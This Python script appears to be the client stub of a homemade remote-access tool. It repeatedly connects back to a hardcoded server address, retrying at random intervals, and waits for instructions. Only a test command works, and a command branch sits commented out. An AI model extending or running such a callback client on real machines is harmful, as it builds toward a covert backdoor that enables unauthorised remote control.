# Imports
import socket
import time
import random

# Variables
lHost = "10.0.7.125"  # Server IP
port = 9999  # Connection Port


# Functions

def send(msg):
    s.send(msg.encode("UTF-8"))


def getInstructions():
    while True:
        msg = s.recv(4096)
        inst = msg.decode("UTF-8")

        # Instructions

        if inst == "test":
            try:
                send("[OK]Test works!")
            except:
                pass
                '''elif inst == "cmd":
                cmd= print("Enter the cmd")
                cmd = cmd.decode("UTF-8")
                send(cmd)
                print(cmd)'''


# Connection

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
host = socket.gethostname()
print(host)
connected = False
while connected == False:
    try:
        s.connect((lHost, port))
        connected = True
        print("Connection Successful")
    except:
        sleepTime = random.randint(20, 30)
        time.sleep(sleepTime)
        print("Connection Failed")
getInstructions()
